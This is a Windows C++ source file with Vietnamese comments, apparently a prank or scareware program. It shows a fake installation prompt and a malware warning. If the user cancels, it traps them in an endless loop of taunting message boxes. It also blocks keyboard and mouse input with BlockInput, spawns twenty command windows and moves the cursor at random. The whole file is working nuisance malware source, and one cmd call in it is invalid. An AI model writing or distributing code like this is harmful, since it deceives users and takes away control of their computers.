#include <iostream> // Khai báo thư viện tiêu chuẩn 
#include <windows.h> // Khai báo thư viện dành cho hệ điều hành windows
#include <ctime>
#include <cstdlib>
        // Tạo hàm tên là dark
            void dark(){
                MessageBoxW(NULL, L"VUI LÒNG NHẤN VÀO NÚT OK ĐỂ TIẾP TỤC QUÁ TRÌNH CÀI ĐẶT", L"THÔNG BÁO", MB_OK | MB_ICONEXCLAMATION);
            }
        // Tạo hàm tên show
            void show(){
                int check = MessageBoxW(NULL, L"TỆP NÀY CHỨA PHẦN MỀM ĐỘC HẠI BẠN CÓ MUỐN TIẾP TỤC HAY KHÔNG ?", L"lỖI", MB_YESNOCANCEL);
                
        // Điều kiện nếu người dùng chọn yes thì sẽ hiển thị thông báo này
                if(check == IDYES){
                    MessageBoxW(NULL, L"VUI LÒNG ĐỢI TRONG GIÂY LÁT", L"CẢNH BÁO", MB_OK);
                }
        // Nếu người dùng nhấn no thì sẽ hiển thị thông báo này
                else if(check == IDNO){
                    MessageBoxW(NULL, L"VUI LÒNG CHỌN TÙY CHỌN KHÁC", L"lỖI", MB_ICONINFORMATION);
                } 
        // Nếu người dùng án vào nút Cancel
                else{
        // Tạo vòng lặp vô tận
            while(true){
                    MessageBoxW(NULL, L"MÀY KHÔNG THOÁT ĐƯỢC ĐÂU CON TRAI", L"NGUY HIỂM", MB_ICONWARNING);
                }
            }
            }
        // Tạo hàm tên block
            void block(){
                BlockInput(true);
                Sleep(4000);
                BlockInput(false);
            }
        // Tạo hàm auto mở cmd
            void openCMD(){
        // Tạo vòng lặp vô tận
            while(true){
                system("start cmd");
                Sleep(1000);
                system("close cmd");
            static int count = 0;
                count++;
            // Nếu mở được 20 cmd thì sẽ ngừng
                if(count == 20){
                    break;
                }
            }
        }
            // Tạo hàm tên fly
                void fly(){
                    while (true)
                 {
                    int with = GetSystemMetrics(SM_CXSCREEN); // Lấy chiều ngang của màn hình
                    int height = GetSystemMetrics(SM_CYSCREEN); // Lấy chiều dọc của màn hình
                        int x = std::rand() % with; // chiều ngang màn hình
                        int y = std::rand() % height; // chiều dọc màn hình

                        static int count = 0;
                            count++;
                            if(count == 30){
                                break; // khi thực hiện tới lần thứ 30 thì sẽ dừng lại
                            }
                            SetCursorPos(x, y); // Lấy tọa độ đã đặt trước đó
                               Sleep(1000); // Dừng 1 giây sau mỗi lần di chuyển con trỏ chuột
                }
            }
        // Hàm main
    int main(){
        // Gọi hàm dark
            dark();
        // Gọi hàm show
            show();
        // Gọi hàm block
           block();
        // Gọi hàm openCMD
            openCMD();
                std::srand(std::time(0));
        // Gọi hàm fly
            fly();
        return 0;
    }